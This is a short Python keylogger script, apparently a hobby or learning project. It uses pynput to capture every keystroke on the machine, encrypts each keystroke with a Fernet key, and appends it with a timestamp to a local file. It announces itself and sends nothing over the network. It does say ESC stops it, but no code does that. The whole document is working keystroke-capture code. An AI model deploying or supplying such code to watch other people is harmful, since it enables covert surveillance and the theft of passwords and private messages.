# This script captures keystrokes, encrypts them using the Fernet key,
# and writes them to a local log file securely with timestamps.

from pynput import keyboard                  # For capturing keystrokes
from cryptography.fernet import Fernet       # For encrypting the logs
from datetime import datetime                # For adding timestamps
import base64                                # For safe storage of encrypted bytes

# Step 1: Load the encryption key from key.key
with open("key.key", "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)  # Create a Fernet encryption object using the key

# Step 2: Log file name
log_file = "keylog.txt"

# Step 3: Function to encrypt and save logs with timestamp
def write_encrypted_log(data):
    # Add a timestamp to the log
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {data}\n"

    # Encrypt the log entry
    encrypted = fernet.encrypt(log_entry.encode())

    # Encode encrypted bytes to base64 before writing to file
    with open(log_file, "ab") as file:
        file.write(base64.b64encode(encrypted) + b"\n")

# Step 4: Function called on each key press
def on_press(key):
    try:
        # Try to log character keys (like letters, numbers)
        write_encrypted_log(str(key.char))
    except AttributeError:
        # Log special keys (like space, enter, shift)
        write_encrypted_log(str(key))

# Step 5: Start listening for keystrokes
print("🟢 Keylogger started. Press ESC to stop.")

# Create a keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
